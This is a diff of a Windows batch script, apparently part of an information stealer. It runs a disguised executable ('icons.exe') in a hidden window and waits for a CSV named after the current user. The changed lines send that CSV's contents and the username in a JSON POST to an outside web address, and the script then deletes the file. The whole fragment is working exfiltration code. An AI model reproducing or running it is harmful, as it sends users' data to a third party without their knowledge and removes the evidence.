@@ -31,24 +31,21 @@ powershell -WindowStyle Hidden -Command "Start-Process 'x64/icons.exe' -Argument
 :: Wait for the CSV file to be created
 timeout /t 10 >nul
 
-:: Read the file content as a string
+:: Read the content of the CSV file and format it as JSON
 setlocal enabledelayedexpansion
 set "fileContent="
 for /f "delims=" %%B in (x64\%username%.csv) do (
     set "fileContent=!fileContent!%%B "
 )
 
-:: Send the content as a POST request with the content inside a JSON object
-powershell -WindowStyle Hidden -Command "
-    $data = @{
-        data = @{
-            username = '%username%'
-            content = '!fileContent!'
-        }
-    }
-    $jsonData = $data | ConvertTo-Json -Compress
-    Invoke-RestMethod -Uri 'https://the-anonymus-stories.vercel.app/untold_story/post' -Method Post -Body $jsonData -ContentType 'application/json'
-"
+:: Escape double quotes for JSON formatting
+set "escapedContent=%fileContent:"=\"%"
+set "jsonData={\"data\":{\"username\":\"%username%\",\"content\":\"%escapedContent%\"}}"
+
+:: Send the JSON data using PowerShell
+powershell -Command ^
+    "$jsonData = '%jsonData%';" ^
+    "Invoke-RestMethod -Uri 'https://the-anonymus-stories.vercel.app/untold_story/post' -Method Post -Body $jsonData -ContentType 'application/json'"
 
 :: Delete the CSV file after sending the data
 del "x64\%username%.csv"
